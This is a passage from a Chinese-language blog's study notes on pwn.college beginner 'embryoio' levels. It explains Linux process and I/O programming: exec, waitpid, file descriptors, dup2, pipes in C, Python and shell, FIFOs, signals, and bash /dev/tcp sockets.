class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-comment">//执行成功无返回；出错返回-1</span><br></code></pre></td></tr></table></figure><h2 id="wait-x2F-waitpid"><a href="#wait-x2F-waitpid" class="headerlink" title="wait &#x2F; waitpid"></a>wait &#x2F; waitpid</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">include &lt;sys/wait.h&gt;<br>waitpid(<span class="hljs-type">pid_t</span> pid ,<span class="hljs-type">int</span> *status ,<span class="hljs-type">int</span> options);<br>wait(<span class="hljs-type">int</span> *status);<br></code></pre></td></tr></table></figure><p>第一个参数为指定的子进程识别码，第二个参数用以了解子进程为什么会退出（不需要则为NULL），第三个为控制waitpid()的函数行为</p><p>当一个parent创建了一个child但没有等它结束就自己结束的话就可能造成系统异常，使用waitpid()来等待孩子进程。</p><table><thead><tr><th align="center">pid值</th><th align="center">waitpid()的操作</th></tr></thead><tbody><tr><td align="center">-1</td><td align="center">等待任一子进程</td></tr><tr><td align="center">&gt;0</td><td align="center">等待其进程ID与pid相等的子进程</td></tr><tr><td align="center">&#x3D;&#x3D;0</td><td align="center">等待其组ID等于调用进程组ID的任一的子进程</td></tr><tr><td align="center">&lt;-1</td><td align="center">等待其组ID等于pid绝对值的任一子进程</td></tr></tbody></table><p><strong>wait函数为waitpid函数的简化版,wait返回任一终止状态的子进程，waitpid等待指定进程</strong></p><h2 id="open-x2F-close"><a href="#open-x2F-close" class="headerlink" title="open &#x2F; close"></a>open &#x2F; close</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>    #<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span>    #<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname ,<span class="hljs-type">int</span> flags)</span>;<br>打开文件成功返回文件描述符（未使用的且为最小的fd）<br>打开文件失败返回 <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><ul><li><p><code>flags</code>：用来控制打开文件的模式</p><ul><li><code>O_RDONLY</code>：只读模式</li><li><code>O_WRONLY</code>：只写模式</li><li><code>O_RDWR</code>：可读可写</li><li>……</li></ul></li><li><p><code>mode</code>：用来设置创建文件的权限（rwx）。当flags中带有<code>O_CREAT</code>时才有效。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>返回值为0则关闭文件成功<br>返回值为-1则代表失败<br></code></pre></td></tr></table></figure><h3 id="文件描述符（file-descriptor）"><a href="#文件描述符（file-descriptor）" class="headerlink" title="文件描述符（file descriptor）"></a>文件描述符（<em>file descriptor</em>）</h3><ul><li><p>进程级 <strong>文件描述符表(file descriptor table)</strong></p><p>一般情况下，每个 Unix&#x2F;Linux 命令运行时都会打开三个文件：</p><ul><li>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</li><li>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</li><li>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</li></ul></li><li><p>系统级 <strong>打开文件表(open file table)</strong></p></li><li><p>文件系统 <strong>i-node表( i-node table)</strong></p></li></ul><p><img src="/img/fd.png"></p><h2 id="dup和dup2"><a href="#dup和dup2" class="headerlink" title="dup和dup2"></a>dup和dup2</h2><p><code>dup()</code>或者<code>dup2()</code>主要是将某个特定的文件描述字输出输出的重定向<br>他们保证将复制的文件描述字到当前未打开的最小描述字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd)</span><br>    参数oldfd表示需要复制的文件（必须已打开）的文件描述符<br>    返回值：若成功复制则返回一个新的文件描述符；若失败则返回-1<br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd, <span class="hljs-type">int</span> newfd)</span>;<br></code></pre></td></tr></table></figure><p><strong>二者区别</strong></p><p>调用<code>dup(oldfd)</code>等效于，<code>fcntl(oldfd, F_DUPFD, 0)</code><br>调用<code>dup2(oldfd, newfd)</code>等效于，<code>close(oldfd)；fcntl(oldfd, F_DUPFD, newfd)；</code></p><h3 id="重定向输入输出"><a href="#重定向输入输出" class="headerlink" title="重定向输入输出"></a>重定向输入输出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> *oldfile ,STDIN_FILENO)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> *oldfile ,STDOUT_FILENO)</span><br></code></pre></td></tr></table></figure><p><strong>STDIN_FILENO 是标准输入的文件描述符</strong></p><h2 id="c脚本重定向输入"><a href="#c脚本重定向输入" class="headerlink" title="c脚本重定向输入"></a>c脚本重定向输入</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//方法1</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>FILE *<span class="hljs-title function_">freopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, FILE *stream)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//方法2</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>   FILE *fp;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该文本重定向到 stdout\n&quot;</span>);<br>   fp = freopen(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>, <span class="hljs-built_in">stdout</span>);<span class="hljs-comment">//创建一个用于读写的新文件</span><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该文本重定向到 file.txt\n&quot;</span>);<br>   fclose(fp);<br>   <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level36-65-PIPES"><a href="#level36-65-PIPES" class="headerlink" title="level36-65 PIPES"></a>level36-65 PIPES</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typora">A pipe is a  form of redirection (transfer of standard output to some other destination)<br><br> allow stdout of a command to be connected to stdin of another command<br><br>pipe character &#x27; | &#x27;<br><br>Pipe is used to combine two or more commands, and in this, the output of one command acts as input to another command, and this command’s output may act as input to the next command and so on. <br><br>Syntax:<br>command_1 | command_2 | command_3 | .... | command_N <br></code></pre></td></tr></table></figure><p>**send EOF &#x3D; ctrl + D  ：close the program **</p><h2 id="python脚本的pipes"><a href="#python脚本的pipes" class="headerlink" title="python脚本的pipes"></a>python脚本的pipes</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2= pwn.process([<span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/X/X/&quot;</span>], stdin=pwn.PIPE)<br>p1= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></td></tr></table></figure><h3 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br>p1 = subprocess.Popen([<span class="hljs-string">&quot;/challenge/embryoio_level&quot;</span>], stdout=subprocess.PIPE)<br>p2 = subprocess.Popen([<span class="hljs-string">&quot;cat&quot;</span>], stdin=p1.stdout, stdout=subprocess.PIPE)<br><span class="hljs-built_in">print</span>(p2.communicate()[<span class="hljs-number">0</span>].decode())<br></code></pre></td></tr></table></figure><h3 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">14</span>]: <span class="hljs-keyword">import</span> pwn<br><span class="hljs-comment">#使用cat传入password</span><br><span class="hljs-comment">#或者使用sendline进行传递</span><br></code></pre></td></tr></table></figure><h3 id="level59"><a href="#level59" class="headerlink" title="level59"></a>level59</h3><p>这题使用subprocess时碰到了一些问题，主要是<code>Popen.communicate()</code>的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Popen.communicate(<span class="hljs-built_in">input</span>=<span class="hljs-literal">None</span>, timeout=<span class="hljs-literal">None</span>)<br><span class="hljs-comment">#与进程交互：将数据发送到 stdin。 从 stdout 和 stderr 读取数据，直到抵达文件结尾。</span><br><span class="hljs-comment">#本题中，若不加入communicate()函数，/challenge的parent变为docker-init</span><br><span class="hljs-comment">#原因为/challenge的parent已经结束，进而发生继承</span><br><span class="hljs-comment">#猜测原因，不使用communicate()，rev不会等待子进程，直接terminates</span><br></code></pre></td></tr></table></figure><h1 id="C脚本的PIPEs"><a href="#C脚本的PIPEs" class="headerlink" title="C脚本的PIPEs"></a>C脚本的PIPEs</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe</span><span class="hljs-params">( <span class="hljs-type">int</span> pipe_fds[<span class="hljs-number">2</span>] )</span>  <br><span class="hljs-comment">//return 成功返回0，否则返回-1。参数数组包含pipe是用的两个文件的描述符。</span><br><span class="hljs-comment">//fd[0]为read管道 fd[1]为write管道</span><br><span class="hljs-comment">//必须在fork中调用pipe()否则子进程不会继承文件描述符。两个进程不共享parent进程就不能使用pipe。</span><br></code></pre></td></tr></table></figure><p>c pipes具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> pid=fork();<br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>        &#123;<br>                <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>                pipe(pipe_fd);<br>                <span class="hljs-type">int</span> i =fork();<br>                <span class="hljs-keyword">if</span> (i!=<span class="hljs-number">0</span>)<br>                &#123;<br>                        dup2(pipe_fd[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>);<br>                        execve(<span class="hljs-string">&quot;/challenge/embryoio_level&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        dup2(pipe_fd[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>);<br>                        execl(<span class="hljs-string">&quot;/bin/cat&quot;</span>,<span class="hljs-string">&quot;/bin/cat&quot;</span>,<span class="hljs-literal">NULL</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                waitpid(pid,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level61-68-find指令"><a href="#level61-68-find指令" class="headerlink" title="level61-68 find指令"></a>level61-68 find指令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /challenge/ -name embryoio_level66 -exec &#123;&#125; ;<br></code></pre></td></tr></table></figure><h1 id="level68-73-shell脚本杂项"><a href="#level68-73-shell脚本杂项" class="headerlink" title="level68-73 shell脚本杂项"></a>level68-73 shell脚本杂项</h1><p><strong>使用c进行辅助更方便些</strong></p><h1 id="level74-79-python脚本杂项"><a href="#level74-79-python脚本杂项" class="headerlink" title="level74-79 python脚本杂项"></a>level74-79 python脚本杂项</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(argv = [], executable = <span class="hljs-string">&quot;/challenge/embryoio_level75&quot;</span>)<br>p.interactive() <span class="hljs-comment">#设置参数为空</span><br></code></pre></td></tr></table></figure><h1 id="level80-85-c脚本杂项"><a href="#level80-85-c脚本杂项" class="headerlink" title="level80-85 c脚本杂项"></a>level80-85 c脚本杂项</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#inlcude <span class="hljs-string">&lt;unistd.h&gt;</span></span><br>chdir(path);<br><span class="hljs-comment">//change the current working directory</span><br></code></pre></td></tr></table></figure><h1 id="level86-98-shell脚本杂项2"><a href="#level86-98-shell脚本杂项2" class="headerlink" title="level86-98 shell脚本杂项2"></a>level86-98 shell脚本杂项2</h1><h2 id="level86-87-interaction"><a href="#level86-87-interaction" class="headerlink" title="level86-87 interaction"></a>level86-87 interaction</h2><p>写了个脚本自动交互，恰好后面也用的上</p><h2 id="level88-89-argv-0"><a href="#level88-89-argv-0" class="headerlink" title="level88-89 argv[0]"></a>level88-89 argv[0]</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">argv[0] is passed into the execve() system call *separately* from the program path to execute.This means that it does not have to be the same as the program path, and that you can actually control it. This is done differently for different methods of execution. For example, in C, you simply need to pass in a different argv[0]. Bash has several ways to do it, but one way is to use a combination of a symbolic link (e.g., the `ln -s` command) and the PATH environment variable.<br></code></pre></td></tr></table></figure><p><strong>设定PATH环境变量</strong></p><p><code>$PATH</code>：输入命令时，系统通过查找PATH中的路径来执行具体文件。各个目录用<code>:</code>分割开</p><p><strong>command</strong></p><ul><li>which – 查找各个外部指令所在的绝对路径</li><li>export – 修改环境变量（临时）</li></ul><h2 id="level90-93-FIFO"><a href="#level90-93-FIFO" class="headerlink" title="level90-93 FIFO"></a>level90-93 FIFO</h2><p><strong>FIFO - named pipe</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typora">有名管道 FIFO 和无名管道 Pipe 主要的区别就是 FIFO 在磁盘上建立管道文件（FIFO 将内核数据缓冲区映射到了实际的文件节点），所以我们可以在磁盘上实际看到，故称为「有名字」，而 Pipe 没有在磁盘上建立文件，我们不能实际看到，故称为「无名」<br>我们使用 FIFO 是在磁盘上建立一个管道文件，然后利用这个文件作为管道的传输通道，但是这个管道文件很特殊，它的大小始终为 0，原因是管道的数据是存放在内核的内存中的，不在管道文件中，我们也可以验证这个事实。<br></code></pre></td></tr></table></figure><p>向管道写数据必须用<code>&gt;</code>，从管道读数据时必须用<code>&lt;</code>。还有一点是写管道的时候必须要用<code>&amp;</code>把进程挂到后台 &#x2F; 或者在两个终端进行交互</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfifo fifo_flie<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mkfifo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">mode_t</span> mode)</span>;<br></code></pre></td></tr></table></figure><h2 id="level94-exec重定向"><a href="#level94-exec重定向" class="headerlink" title="level94 exec重定向"></a>level94 exec重定向</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec fd_num &lt; filename #打开文件作为当前shell的输入，并分配文件描述符<br></code></pre></td></tr></table></figure><h2 id="level97-98-信号"><a href="#level97-98-信号" class="headerlink" title="level97-98 信号"></a>level97-98 信号</h2><p>使用<code>kill -signum pid</code>可以发送指定的信号给指定的进程。</p><h1 id="level99-111-python杂项2"><a href="#level99-111-python杂项2" class="headerlink" title="level99-111 python杂项2"></a>level99-111 python杂项2</h1><p>重复86-98的工作</p><h1 id="level112-124-c杂项2"><a href="#level112-124-c杂项2" class="headerlink" title="level112-124 c杂项2"></a>level112-124 c杂项2</h1><p>重复86-98的工作</p><h1 id="level125-139-脚本编写"><a href="#level125-139-脚本编写" class="headerlink" title="level125-139 脚本编写"></a>level125-139 脚本编写</h1><p>均使用pwntools编写，计算依靠eval()实现，发送信号由os.kill实现</p><p>令程序的stdin,stdout都由cat来连接时，pwntools的pipe似乎不怎么好用(?)，使用os.pipe实现</p><h1 id="level140-Webserver"><a href="#level140-Webserver" class="headerlink" title="level140 Webserver"></a>level140 Webserver</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>在 Linux 中有这样一个特殊文件 <code>/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125;</code>，打开这个文件，就相当于发出了一个 socket 调用，建立了一个 socket 连接，读写这个文件就相当于在该 socket 连接中传输数据。</p><p><code>/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125;</code>不是一个真实的文件，且仅存在于bash，其他的shell如sh、dash、zsh中是没有的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">exec</span> 9&lt;&gt; /dev/tcp/www.baidu.com/80</span><br>在当前 shell 中创建一个文件描述符 9，该文件描述符的输入和输出都重定向到/dev/tcp/www.baidu.com/80<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">while read -u 3 LINE;do #从fd3读取并输出<br>        echo $LINE<br>        line1=$LINE<br>        echo 1 &gt;&amp;3 #输出到指定fd<br>done<br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>直接使用 pwntools 的 remote</p><h2 id="c"><a href="#c" class="headerlink" title="c"></a>c</h2><p>c语言socket programming (TCP)</p><p><a href="https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/">https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/</a></p><p><a href="https://www.geeksforgeeks.org/socket-programming-cc/">https://www.geeksforgeeks.org/socket-programming-cc/</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwncollege</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
